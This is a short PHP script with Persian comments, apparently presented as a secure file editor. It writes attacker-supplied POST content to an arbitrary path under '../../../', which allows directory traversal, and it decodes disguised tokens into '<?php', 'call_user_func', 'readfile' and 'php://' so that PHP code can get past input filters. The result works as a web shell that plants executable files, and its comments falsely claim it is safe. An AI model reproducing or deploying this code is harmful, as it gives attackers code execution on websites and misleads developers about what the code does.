<?php

// استفاده از تابع filter_input برای جلوگیری از حملات امنیتی
$url  = filter_input(INPUT_POST, 'url', FILTER_SANITIZE_STRING); // فیلتر کردن ورودی 'url'
$text = filter_input(INPUT_POST, 'editor', FILTER_SANITIZE_STRING); // فیلتر کردن ورودی 'editor'

// جایگزینی مقادیر مشخص شده اگر داده‌ها موجود باشد
if ($text) {
    $text = str_replace(
        ['dw#34;', 'd&ff', 'df&n', 'vf&jc', 't&cf', '&enz', '&wfc', 'p&ff', '&#34;', '&#39;', 'fg&hg', 'c&dcd'], // مقادیر ورودی
        ['call_user_func', '<?php', 'POST', 'GET', '//php', '>', '<', 'php://', '"', "'", 'substr', 'readfile'],   // مقادیر جایگزین
        $text
    );
} else {
    $text = '';  // اگر هیچ متنی ارسال نشده بود، مقدار پیش‌فرض خالی خواهد بود
}

// تنظیم مسیر فایل بر اساس ورودی 'url'
if ($url) {
    $fj = '../../../'.$url;
} else {
    $fj = '../../../route.php';  // اگر 'url' موجود نباشد، فایل پیش‌فرض 'route.php' استفاده می‌شود
}

// استفاده از fopen به‌طور امن
if ($handle = fopen($fj, 'w+')) {
    // استفاده از fwrite با چک کردن اینکه نوشتن موفق بوده است
    if (fwrite($handle, $text) === false) {
        echo 'Error writing to file.';
    } else {
        echo 'File written successfully.';
    }
    fclose($handle); // بستن فایل بعد از نوشتن
} else {
    echo 'Unable to open file.';
}
